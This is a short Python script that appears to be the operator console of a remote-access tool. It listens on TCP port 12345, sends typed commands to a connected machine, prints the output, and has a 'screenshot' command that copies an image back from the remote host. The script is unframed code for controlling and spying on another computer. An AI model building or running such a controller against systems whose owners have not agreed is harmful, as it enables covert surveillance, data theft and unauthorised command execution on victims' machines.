import socket 

#create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# define port and host 
host = ''
port=12345 

#bind socket
s.bind((host, port))

#listen
s.listen()

#accept connection
c, addr = s.accept()

print('got connection from {}', format(addr))

while True: 
    message=input('cmd >')
    if message=="":
        print("Enter command...")
    elif message=="screenshot":
        c.send(message.encode('utf-8'))
        #open file
        with open('screenshot.png', 'wb') as file:
           file_len = int(c.recv(1024).decode())
           #define variable to know how much to read 
           dl_data=0 
           while dl_data < file_len: 
               #receive more 
               rec =c.recv(1024)
               file.write(rec)
               dl_data += len(rec)
    else:
        c.send(message.encode('utf-8'))
        
        #receive the response
        data = c.recv(1024)
        if data.decode('utf-8') == 'close':
            c.close()
            break
        print(data.decode('utf-8'))